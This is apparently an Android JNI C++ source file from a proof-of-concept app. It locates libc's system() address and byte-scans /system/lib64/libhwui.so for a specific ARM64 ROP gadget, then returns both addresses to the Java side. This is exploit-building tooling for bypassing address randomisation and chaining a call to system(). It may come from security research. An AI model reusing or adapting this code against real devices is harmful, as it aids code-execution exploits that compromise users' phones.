#include <jni.h>
#include <string>
#include <dlfcn.h>
#include <link.h>

typedef uint8_t byte;
char *gadget_p;
void* libc,* lib;

//dls iteration for rop
int dl_callback(struct dl_phdr_info *info, size_t size, void *data)
{
    int j;
    const char *base = (const char *)info->dlpi_addr;
    for (j = 0; j < info->dlpi_phnum; j++) {
        const ElfW(Phdr) *phdr = &info->dlpi_phdr[j];
        if (phdr->p_type == PT_LOAD && (strcmp("/system/lib64/libhwui.so",info->dlpi_name) == 0)) {
            gadget_p = (char *) base + phdr->p_vaddr;
            return 1;
        }
    }
    return 0;
}

//system address
void* get_system_address(){
    libc = dlopen("libc.so",RTLD_GLOBAL);
    void* address = dlsym( libc, "system");
    return address;
}

//rop gadget address
void get_gadget_lib_base_address() {
    lib = dlopen("libhwui.so",RTLD_GLOBAL);
    dl_iterate_phdr(dl_callback, NULL);
}

//search gadget
long search_for_gadget_offset() {
    char *buffer;
    long filelen;
    char curChar;
    long pos = 0; 
    int curSearch = 0;
    //reading file
    FILE* fd = fopen("/system/lib64/libhwui.so","rb");
    fseek(fd, 0, SEEK_END);
    filelen = ftell(fd);
    rewind(fd);
    buffer = (char *)malloc((filelen+1)*sizeof(char));
    fread(buffer, filelen, 1, fd);
    fclose(fd);
    //searching for bytes
    byte g1[12] = {0x68, 0x0E, 0x40, 0xF9, 0x60, 0x82, 0x00, 0x91, 0x00, 0x01, 0x3F, 0xD6};
    while(pos <= filelen){
        curChar = buffer[pos];pos++;
        if(curChar == g1[curSearch]){
            curSearch++;
            if(curSearch > 11){
                curSearch = 0;
                pos-=12;
                break;
            }
        }
        else{
            curSearch = 0;
        }
    }
    return pos;
}

extern "C" JNIEXPORT jstring JNICALL Java_com_valbrux_myapplication_MainActivity_getSystem(JNIEnv* env,jobject) {
    char buff[30];
    //system address
    snprintf(buff, sizeof(buff), "%p", get_system_address());
    dlclose(libc);
    std::string system_string = buff;
    return env->NewStringUTF(system_string.c_str());
}



extern "C" JNIEXPORT jstring JNICALL Java_com_valbrux_myapplication_MainActivity_getROPGadget(JNIEnv* env,jobject) {
    char buff[30];
    get_gadget_lib_base_address();
    //gadget address
    snprintf(buff, sizeof(buff), "%p",gadget_p+search_for_gadget_offset());
    dlclose(lib);
    std::string system_string = buff;
    return env->NewStringUTF(system_string.c_str());
}